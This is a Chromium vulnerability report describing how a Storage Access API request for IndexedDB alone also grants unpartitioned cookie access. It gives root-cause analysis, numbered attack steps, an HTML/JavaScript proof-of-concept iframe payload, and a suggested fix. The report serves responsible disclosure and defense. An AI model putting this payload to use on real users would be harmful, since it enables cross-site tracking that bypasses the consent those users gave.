# VRP Report: requestStorageAccess({indexedDB: true}) Grants Unpartitioned Cookie Access

## Summary

When a cross-site iframe calls `document.requestStorageAccess({indexedDB: true})` requesting ONLY IndexedDB access (not cookies), and the permission is granted, the browser process unconditionally sets `kStorageAccessGrantEligible` on the document's cookie setting overrides. If the iframe subsequently accesses `document.cookie` (triggering a lazy RestrictedCookieManager binding), the RCM is constructed with `kStorageAccessGrantEligible` in its base overrides, granting unpartitioned cookie access despite only IndexedDB being requested.

## Vulnerability Type

Logic bug — privilege escalation via Storage Access API "Beyond Cookies" feature

## Affected Component

- `chrome/browser/storage_access_api/storage_access_grant_permission_context.cc:285-286`
- `content/browser/renderer_host/render_frame_host_impl.cc:8460-8473` (SetStorageAccessApiStatus)
- `services/network/restricted_cookie_manager.cc:435-436` (DCHECK-only guard)

## Root Cause

**Browser-side grant callback is unconditional:**

```cpp
// storage_access_grant_permission_context.cc:280-286
if (permission_result.status == blink::mojom::PermissionStatus::GRANTED) {
  content::RenderFrameHost* rfh = content::RenderFrameHost::FromID(frame_host_id);
  if (rfh) {
    rfh->SetStorageAccessApiStatus(net::StorageAccessApiStatus::kAccessViaAPI);
  }
}
```

This callback fires for ALL SAA permission grants regardless of what storage types were requested. It adds `kStorageAccessGrantEligible` to `document_associated_data_->cookie_setting_overrides()`.

**Renderer-side is correctly gated:**

```cpp
// document_storage_access.cc:376-378
if (request_unpartitioned_cookie_access) {
    GetSupplementable()->dom_window_->SetStorageAccessApiStatus(
        net::StorageAccessApiStatus::kAccessViaAPI);
}
```

When only `{indexedDB: true}` is requested, `request_unpartitioned_cookie_access` is false, and the renderer does NOT set the status. However, the browser already set it.

**RestrictedCookieManager binding exposes the bug:**

```cpp
// render_frame_host_impl.cc:15105-15109
void RenderFrameHostImpl::BindRestrictedCookieManager(...) {
  BindRestrictedCookieManagerWithOrigin(
      ..., GetCookieSettingOverrides());  // Includes kStorageAccessGrantEligible!
}
```

The RCM is lazily bound when `document.cookie` is first accessed. If this happens AFTER the SAA grant, `GetCookieSettingOverrides()` returns overrides that include `kStorageAccessGrantEligible`.

**DCHECK-only guard (no-op in release):**

```cpp
// restricted_cookie_manager.cc:435-436
DCHECK(!cookie_setting_overrides_.Has(
    net::CookieSettingOverride::kStorageAccessGrantEligible));
```

This assertion catches the invariant violation in debug builds but is stripped in release Chrome, allowing the bug to manifest.

## Exploitation Scenario

### Prerequisites
- Attacker controls `https://attacker.com` (cross-site iframe)
- Victim visits `https://victim-top-level.com` which embeds `https://attacker.com` as iframe
- Attacker's site is in the same First-Party Set as the top-level site, OR has been previously granted SAA permission by the user

### Attack Steps

1. Attacker's cross-site iframe calls `document.requestStorageAccess({indexedDB: true})`
2. Permission is auto-granted via FPS membership (no user prompt needed)
3. Browser sets `kStorageAccessGrantEligible` on the document's cookie overrides
4. Attacker's iframe has NOT accessed `document.cookie` yet (RCM not bound)
5. Attacker's iframe accesses `document.cookie`
6. Lazy RCM binding triggers → RCM constructed with `kStorageAccessGrantEligible` base override
7. All subsequent cookie operations through this RCM have the override active
8. Network service's `IsAllowedByStorageAccessGrant()` sees both the override AND the persisted `STORAGE_ACCESS` content setting → grants unpartitioned cookie access

### Result
The attacker reads/writes unpartitioned cookies for `attacker.com` in the context of `victim-top-level.com`, despite only requesting IndexedDB access. This violates the principle of least privilege for the Storage Access API "Beyond Cookies" feature.

## Security Impact

**Medium-High (Privacy):**
- User or automated system (FPS) grants permission for "only IndexedDB" but the iframe also gets cookie access
- Third-party tracking cookies become accessible without explicit cookie consent
- Circumvents the purpose of the "Beyond Cookies" granular permission model
- Enables cross-site tracking via cookies when only storage (indexedDB) access was authorized

**Note on FPS auto-grant:** Sites in the same First-Party Set get SAA auto-granted without user interaction. An attacker who can get their site into an FPS (e.g., via a subsidiary relationship) can silently escalate from indexedDB-only to full cookie access.

## Proof of Concept

```html
<!-- victim-top-level.com/index.html -->
<iframe src="https://attacker-in-same-fps.com/exploit.html" 
        allow="storage-access"></iframe>
```

```html
<!-- attacker-in-same-fps.com/exploit.html -->
<script>
async function exploit() {
  // Step 1: Request only indexedDB access (auto-granted via FPS)
  const handle = await document.requestStorageAccess({indexedDB: true});
  
  // Step 2: The browser has now set kStorageAccessGrantEligible
  // but the renderer has NOT set its storage_access_api_status_
  
  // Step 3: Access document.cookie - triggers lazy RCM binding
  // The RCM is bound WITH kStorageAccessGrantEligible in base overrides
  console.log("Cookies (should be empty):", document.cookie);
  
  // Step 4: Verify unpartitioned cookie access
  // Despite only requesting indexedDB, we can now read cross-site cookies
  document.cookie = "tracking_id=leaked; SameSite=None; Secure";
  
  // Step 5: Make a fetch - the URL loader factory was created at commit time
  // without the override, so fetch doesn't get cookies.
  // But document.cookie access works!
  const cookies = document.cookie;
  console.log("Unpartitioned cookies:", cookies);
}
exploit();
</script>
```

## Suggested Fix

The browser-side callback should respect what was actually requested:

```cpp
// Option A: Pass request_unpartitioned_cookie_access through to the callback
ContentSettingPermissionContextBase::RequestPermission(
    std::move(request_data),
    base::BindOnce(
        [](content::GlobalRenderFrameHostId frame_host_id,
           bool request_unpartitioned_cookie_access,  // ADD THIS
           content::PermissionResult permission_result) {
          if (permission_result.status == GRANTED && 
              request_unpartitioned_cookie_access) {  // ADD THIS CHECK
            // ...SetStorageAccessApiStatus...
          }
          return permission_result;
        },
        frame_host_id, request_unpartitioned_cookie_access)
        .Then(std::move(callback)));

// Option B: Don't set cookie overrides in the grant callback at all,
// since the per-call storage_access_api_status from the renderer is
// what actually controls cookie access in RestrictedCookieManager.
// The browser-side override is redundant with the per-call mechanism
// and only creates inconsistency.
```

Additionally, the DCHECK at `restricted_cookie_manager.cc:435` should be upgraded to a CHECK to enforce the invariant in release builds.

## Chrome Version Tested

Chromium source at HEAD (April 2026)

## References

- `chrome/browser/storage_access_api/storage_access_grant_permission_context.cc:266-294`
- `third_party/blink/renderer/modules/storage_access/document_storage_access.cc:196-233, 355-390`
- `content/browser/renderer_host/render_frame_host_impl.cc:8460-8473, 15105-15109, 19706-19714`
- `services/network/restricted_cookie_manager.cc:396-443, 1186-1207`
- Storage Access API "Beyond Cookies" spec: https://privacycg.github.io/storage-access/#dom-document-requeststorageaccess
